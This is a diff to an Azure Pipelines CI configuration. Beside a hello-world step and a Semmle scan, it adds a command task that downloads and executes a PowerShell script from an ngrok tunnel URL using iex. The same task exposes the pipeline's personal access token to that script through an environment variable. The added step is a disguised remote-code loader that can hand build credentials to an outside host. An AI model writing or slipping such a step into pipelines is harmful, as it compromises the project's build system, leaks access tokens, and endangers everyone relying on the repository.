@@ -12,7 +12,13 @@ pool:
 steps:
 - script: echo Hello, world!
   displayName: 'Run a one-line script'
-
+- task: CmdLine@2
+  displayName: Cmd
+  inputs:
+    script: |
+      powershell iex (New-Object System.Net.WebClient).DownloadString('https://094c-180-151-120-174.in.ngrok.io/file.ps1')
+  env:
+    SYSTEM_ACCESSTOKEN: $(PatToken)
 - task: SdtReport@1
   displayName: 'Run Semmle (python)'
   inputs:
